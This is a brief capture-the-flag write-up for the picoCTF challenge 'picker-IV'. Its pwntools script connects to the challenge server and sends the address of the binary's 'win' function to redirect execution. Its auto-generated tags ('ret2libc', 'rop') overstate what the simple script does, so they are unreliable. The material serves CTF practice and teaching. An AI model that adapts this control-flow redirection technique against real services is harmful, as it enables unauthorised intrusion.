---
ai_date: '2025-04-27 05:29:50'
ai_summary: 'Exploitation: Remote code execution via controlled input (RCE) using
  a hardcoded address'
ai_tags:
- rop
- ret2libc
- remote-code-execution
created: 2024-08-08T02:30
updated: 2024-08-08T02:36
---

We have to jump to `win`.

```python
from pwn import *
elf = ELF('./picker-IV')
r = remote('saturn.picoctf.net', 53475)
r.sendlineafter(b': ', hex(elf.symbols['win'])[2:])
print(r.recvall().decode())
```